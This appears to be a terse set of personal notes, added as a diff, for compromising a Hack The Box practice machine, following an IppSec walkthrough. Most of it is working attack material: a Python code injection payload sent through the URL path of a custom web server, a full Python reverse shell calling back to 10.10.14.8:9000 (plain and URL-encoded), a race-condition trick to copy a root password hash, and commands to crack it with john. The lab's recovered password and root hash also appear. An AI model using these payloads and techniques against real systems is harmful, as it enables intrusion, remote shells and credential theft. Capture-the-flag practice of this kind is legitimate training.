@@ -1,0 +1,43 @@
+//based on IppSec
+wfuzz -Z --hw 14 -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+http://obscure.htb:8080/develop/SuperSecureServer.py
+
+python3 main.py
+curl localhost:8181/ndex.html
+
+//get code exec, shows on console not browser, try locally fist
+GET /'%3bprint("something")%3b' HTTP/1.1		
+Host: localhost:8181
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept-Encoding: gzip, deflate
+Connection: close
+
+/';print("something2 else");'
+/';os.system("whoami");'
+tcpdump -i tun0 icmp
+
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);	//pentestmonkey reverseshell
+
+/'%3bimport%20socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("10.10.14.8",9000))%3bos.dup2(s.fileno(),0)%3b%20os.dup2(s.fileno(),1)%3b%20os.dup2(s.fileno(),2)%3bp%3dsubprocess.call(["/bin/sh","-i"])%3b'
+
+ps -ef |grep SuperSecure
+
+/home/robert has BetterSSH/, Supersecurecrypt.py, passwordreminder.txt, out.txt, check.txt
+key = out.txt - check.txti
+//i=input file (out.txt)
+//k= string (Encrypting this file with ... )
+//o= Outfile (key.txt)
+python3 SuperSecureCrypt.py -d -i out.txt -k 'Encrypting this file with your key should result in out.txt, make sure your key is correct!' -o key.txt
+alexandrovich
+python3 SuperSecureCrypt.py -d -i passwordreminder.txt -k 'alexandrovich' -o decrypted.txt
+SecThruObsFTW
+
+su - robert	//paste the pass and got shell with user.txt
+robert@obscure:/tmp/SSH$ watch -n .5 ls
+robert@obscure:/tmp/SSH$ watch -n .5 cp * /dev/shm/
+sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+
+while true; do sleep .1; cp -r . /tmp; done	//do this if the watch dog changes * by only the files in that moment, and try again
+
+$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1	//root's hash
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
